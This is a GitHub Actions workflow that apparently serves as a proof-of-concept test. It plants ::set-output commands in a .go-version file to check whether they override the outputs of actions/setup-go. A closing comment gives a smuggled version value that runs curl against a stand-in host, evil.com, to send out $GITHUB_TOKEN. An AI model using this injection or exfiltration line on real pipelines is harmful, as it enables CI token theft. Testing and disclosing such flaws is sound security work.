name: Go Output Override Test
on:
  workflow_dispatch:

jobs:
  test-override:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      
      - name: Create .go-version that injects go-version output
        run: |
          # The injected ::set-output sets go-version to a value with command injection
          # Note: setup-go fails because the version is invalid, so its OWN output is empty
          # The ::set-output:: fills the void
          printf 'dummy\n::set-output name=go-version::INJECTED_GO_VERSION_1.99\n::set-output name=cache-hit::true\n1.22.0' > .go-version
          
      - name: Setup Go (fails, but ::set-output injects go-version)
        id: setup
        uses: actions/setup-go@v5
        with:
          go-version-file: '.go-version'
        continue-on-error: true
        
      - name: Check INJECTED output values
        run: |
          echo "=== CRITICAL OUTPUT TEST ==="
          echo "go-version output: '${{ steps.setup.outputs.go-version }}'"
          echo "cache-hit output: '${{ steps.setup.outputs.cache-hit }}'"
          echo ""
          echo "If go-version shows INJECTED_GO_VERSION_1.99, the injection OVERRODE setup-go's output!"
          echo "If cache-hit shows true, an attacker can fake cache hits!"
          
      - name: Simulate unsafe downstream usage
        run: |
          GO_VER="${{ steps.setup.outputs.go-version }}"
          echo "Building with Go version: $GO_VER"
          # In real workflows, this might be: curl "https://go.dev/dl/go${GO_VER}.linux-amd64.tar.gz"
          # With injection: go-version = "1.22; curl evil.com/steal?token=$GITHUB_TOKEN; echo "
